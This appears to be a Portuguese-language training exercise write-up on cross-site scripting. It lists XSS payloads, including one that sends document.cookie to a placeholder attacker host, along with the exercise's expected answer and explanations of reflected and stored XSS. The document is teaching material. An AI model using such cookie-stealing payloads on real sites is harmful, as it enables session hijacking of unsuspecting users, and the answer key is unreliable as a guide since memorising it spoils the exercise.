## Módulo 00 / Exercício 00 - Payloads

Esses são alguns tipos de payloads que podem ser usados por atacantes para identificar se uma página pode conter vulnerabilidades XSS:

    alert("Teste")

Caso o navegador apresente um pop-up com o valor Teste, é entendido que há uma grande possibilidade desse site estar vulnerável.

Em seguida o atacante pode começar a explorar a vulnerabilidade mais afundo:

    new Image().src="http://paginadoatacante/?cookie="+document.cookie

No caso do **exercício 00**, para realizar a resposta esperada, o script que deve ser inserido no campo de texto é o seguinte:

    document.getElementById("cookieOutput").innerText = "Cookie value:" + document.cookie


## Cenários:

Para aplicar esse tipo de vulnerabilidade o atacante precisa conseguir injetar script maliciosos em páginas vulneráveis. Sendo de dois tipos:

* **Reflected XSS** - Neste caso, o script não está armazenado em um servidor de destino e precisará ser entregue para cada vítima. Esse script pode ser entregue através de uma mensagem de erro ou um resultado de busca. 

    Uma forma frequente será um link distribuído por meio de esquemas de phishing. Ao acionar o servidor, por meio do link, o script será refletido e executado no navegador. Esta técnica é a mais frequente.

* **Stored XSS** - Neste tipo de ataque, o script é armazenado em banco de dados. Dessa forma, qualquer usuario que tentar acessar o site vulnerável irá executar o código malicioso. 

    Um exemplo são campos de comentários. Se a pessoa comentar com um script javascript e o site não tiver as devidas medidas de segurança, o código pode ser executado sempre que alguém entrar na página.
    
    Assim, todos os usuários que acessarem essa página de comentários o script será carregado e executado automaticamente.


